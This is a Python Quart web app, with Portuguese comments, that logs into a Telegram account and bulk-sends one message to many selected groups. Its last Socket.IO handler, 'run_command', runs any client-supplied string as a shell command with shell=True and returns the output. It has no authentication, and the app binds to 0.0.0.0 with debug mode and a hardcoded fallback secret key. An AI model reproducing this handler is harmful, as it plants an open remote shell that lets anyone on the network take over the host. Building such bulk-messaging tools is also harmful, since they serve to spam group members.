import os
import asyncio
import subprocess
from quart import Quart, render_template, request, redirect, url_for, session, jsonify
from quart_socketio import SocketIO, emit
from telethon import TelegramClient
from telethon.sessions import StringSession

app = Quart(__name__)
app.secret_key = os.getenv('SECRET_KEY', 'seu_segredo_aqui')

# Inicialize o SocketIO com a instância do Quart
socketio = SocketIO(app)

# Configure o API ID e o API Hash como variáveis de ambiente
api_id = os.getenv('API_ID')  # Defina seu API ID nas variáveis de ambiente
api_hash = os.getenv('API_HASH')  # Defina seu API Hash nas variáveis de ambiente

client = None
sending = False
stop_sending_event = asyncio.Event()

def ensure_sessions_dir():
    if not os.path.exists('sessions'):
        os.makedirs('sessions')

async def async_start_client(phone_number):
    global client
    session_file = f'sessions/{phone_number}.session'
    ensure_sessions_dir()
    
    if os.path.exists(session_file):
        with open(session_file, 'r') as f:
            session_string = f.read().strip()
            client = TelegramClient(StringSession(session_string), api_id, api_hash)
    else:
        client = TelegramClient(StringSession(), api_id, api_hash)
        await client.connect()
        if not await client.is_user_authorized():
            await client.send_code_request(phone_number)
            return False  # Código de verificação necessário
        session_string = client.session.save()
        with open(session_file, 'w') as f:
            f.write(session_string)
    
    await client.connect()
    return True  # Login bem-sucedido

@app.route('/login', methods=['GET', 'POST'])
async def login():
    if request.method == 'POST':
        phone_number = (await request.form)['phone_number']
        session['phone_number'] = phone_number
        if not await async_start_client(phone_number):
            return redirect(url_for('verify_code'))
        return redirect(url_for('index'))
    return await render_template('login.html')

@app.route('/verify_code', methods=['GET', 'POST'])
async def verify_code():
    if request.method == 'POST':
        code = (await request.form)['code']
        phone_number = session.get('phone_number')
        if client and client.session:
            try:
                await client.sign_in(code=code)
                session_file = f'sessions/{phone_number}.session'
                session_string = client.session.save()
                with open(session_file, 'w') as f:
                    f.write(session_string)
                return redirect(url_for('index'))
            except Exception as e:
                return f"Erro ao verificar o código: {e}"
    return await render_template('verify_code.html')

@app.route('/')
async def index():
    if 'phone_number' not in session:
        return redirect(url_for('login'))

    phone_number = session.get('phone_number')

    if client is None or not client.is_connected():
        await async_start_client(phone_number)

    try:
        dialogs = await client.get_dialogs()
        groups = [(dialog.id, dialog.name) for dialog in dialogs if dialog.is_group]
        return await render_template('index.html', groups=groups)
    except Exception as e:
        print(f"Erro ao tentar listar os grupos: {str(e)}")
        return await render_template('index.html', groups=[])

@app.route('/send_messages', methods=['POST'])
async def send_messages():
    global sending, stop_sending_event
    form = await request.form
    group_ids = form.getlist('groups')
    delay = float(form['delay'])
    message = form['message']

    session['status'] = {'sending': [], 'errors': []}
    sending = True
    stop_sending_event.clear()

    async def send_messages_task():
        global sending
        for group_id in group_ids:
            if not sending:
                break
            try:
                await client.send_message(int(group_id), message)
                session['status']['sending'].append(f"✅ Mensagem enviada para o grupo {group_id}")
                await asyncio.sleep(delay)
            except Exception as e:
                session['status']['errors'].append(f"❌ Erro ao enviar mensagem para o grupo {group_id}: {str(e)}")

        sending = False
        stop_sending_event.set()

    await send_messages_task()
    return jsonify(session['status'])

@app.route('/status_updates')
async def status_updates():
    if 'status' in session:
        return jsonify(session['status'])
    return jsonify({'sending': [], 'errors': []})

@app.route('/stop_sending', methods=['POST'])
async def stop_sending():
    global sending
    sending = False
    stop_sending_event.set()
    return jsonify(session.get('status', {'sending': [], 'errors': []}))

@socketio.on('run_command')
async def handle_command(data):
    command = data['command']
    try:
        output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
        output = output.decode('utf-8')
    except subprocess.CalledProcessError as e:
        output = e.output.decode('utf-8')

    emit('command_output', {'output': output})

if __name__ == '__main__':
    socketio.run(app, host='0.0.0.0', port=int(os.getenv('PORT', 5000)), debug=True)
